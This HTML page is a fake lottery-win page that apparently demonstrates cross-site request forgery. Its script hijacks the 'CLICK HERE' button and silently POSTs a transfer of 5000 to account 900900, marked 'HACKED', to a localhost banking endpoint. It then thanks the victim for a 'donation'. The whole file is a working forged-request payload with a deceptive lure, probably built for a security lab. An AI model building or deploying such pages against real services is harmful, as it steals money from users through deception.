<html>

<head>
    <title>LOTTERY</title>
    <script src="https://code.jquery.com/jquery-3.1.1.min.js" type="text/javascript"></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <script>
        $(document).ready(function () {
            $("form").submit(function (event) {
                var formData = {
                    account: 900900,
                    amount: 5000,
                    comments: 'HACKED'
                };
                $.ajax({
                    type: "POST",
                    url: "http://localhost:8080/transfer",
                    data: formData,
                    encode: true,
                }).done(function (data) {
                    $("#content").html("<h1>THANK YOU FOR YOUR KIND DONATION</h1>");
                });

                event.preventDefault();
            });
        });
    </script>
</head>

<body>
    <div class="container text-center m-5" id="content">
        <h3 class="mb-3" id="message">YOU HAVE WON A $1M LOTTERY</h3>
        <form class="row" method="post">
            <button type="submit" class="btn btn-primary">CLICK HERE</button>
        </form>
    </div>
</body>

</html>
